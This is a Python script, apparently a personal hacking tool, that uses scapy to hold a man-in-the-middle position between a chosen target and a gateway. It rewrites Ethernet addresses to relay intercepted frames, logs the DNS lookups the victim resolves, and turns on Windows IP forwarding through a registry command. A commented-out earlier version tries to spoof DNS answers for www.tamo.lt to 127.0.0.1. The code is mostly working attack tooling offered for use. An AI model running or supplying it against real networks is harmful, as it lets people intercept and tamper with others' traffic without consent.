# from scapy.all import sendp, sniff, Ether, IP, get_if_hwaddr, sendpfast
# import argparse, subprocess
# import logging

# Interface = "Wi-Fi"

# sniff_filter = "udp port 53"

# def spell_func(packet):
#     try:
#         if packet.haslayer("DNS"):
#             if packet["DNS"].qd.qname.decode() == "www.tamo.lt." and packet["DNS"].qr == 1:
#                 print("Got data")
#                 if packet["DNS"].an.rdata != None:
#                     packet.an.rdata = "127.0.0.1"
#     except KeyboardInterrupt:
#         exit(0)

# try:
#     sniff(iface=Interface, filter=sniff_filter, prn=spell_func, store=0)
# except KeyboardInterrupt:
#     exit(0)



from scapy.all import sendp, sniff, Ether, IP, get_if_hwaddr, sendpfast, DNS
import argparse, subprocess
import logging



def forward_packet(packet):
    """Optimized forwarding of packets between target and gateway."""
    if packet[Ether].src == MAC_A:  # From Target -> Gateway

        packet[Ether].src = OWN_MAC
        packet[Ether].dst = MAC_B
        sendp(packet, iface="Wi-Fi", verbose=False)


    elif packet[Ether].src == MAC_B and packet.haslayer(IP):  # From Gateway -> Target
        if packet[IP].dst == IP_A:
            if packet.haslayer("DNS"):
                if packet["DNS"].qd.qname != None and packet["DNS"].qr == 1:
                    for i in range(packet[DNS].ancount):  # Iterate over all answer records
                        if packet["DNS"].an.rdata != None:
                            if packet["DNS"].an is not None and hasattr(packet["DNS"].an, 'rdata'):
                                print(f"Resolved IP for domain - |{packet[DNS].qd.qname}| : {packet[DNS].an.rdata}")
            packet[Ether].src = OWN_MAC
            packet[Ether].dst = MAC_A
            sendp(packet, iface="Wi-Fi", verbose=False)

# Setup optimized logging (reduce overhead)
logging.basicConfig(format='[%(asctime)s] %(message)s', level=logging.INFO)

# Command-line arguments
parser = argparse.ArgumentParser(description="Optimized ARP Spoofing and MAC Forwarding")
parser.add_argument("--target_mac", required=True, help="Target MAC address")
parser.add_argument("--gateway_mac", required=True, help="Gateway MAC address")
parser.add_argument("--target_ip", required=True, help="Target IP address")
parser.add_argument("--gateway_ip", required=True, help="Gateway IP address")
parser.add_argument("--interface", default="Wi-Fi", help="Network interface name")
parser.add_argument("--log", default="0", help="0/1 for log")
args = parser.parse_args()




INTERFACE = args.interface
MAC_A = args.target_mac
MAC_B = args.gateway_mac
IP_A = args.target_ip
IP_B = args.gateway_ip
LOG_ENABLE = int(args.log)
OWN_MAC = get_if_hwaddr(INTERFACE)

logging.info(f"Listening on {INTERFACE} | Target: {IP_A} ({MAC_A}) <-> Gateway: {IP_B} ({MAC_B})")


def set_ip_forwarding(enable: bool):
    """Enable or disable global IP forwarding in Windows."""
    value = "1" if enable else "0"
    command = f'reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d {value} /f'
    subprocess.run(command, shell=True, check=True)
    print(f"IP Forwarding {'Enabled' if enable else 'Disabled'} (Global Setting)")

# Example Usage
set_ip_forwarding(True)  # Enable IP forwarding




# Efficient sniffing with BPF filter (reduces unnecessary packet processing)
logging.info("MITM Forwarding Active...")
sniff(iface=INTERFACE, prn=forward_packet, filter="ether src {} or ether src {}".format(MAC_A, MAC_B), store=0)
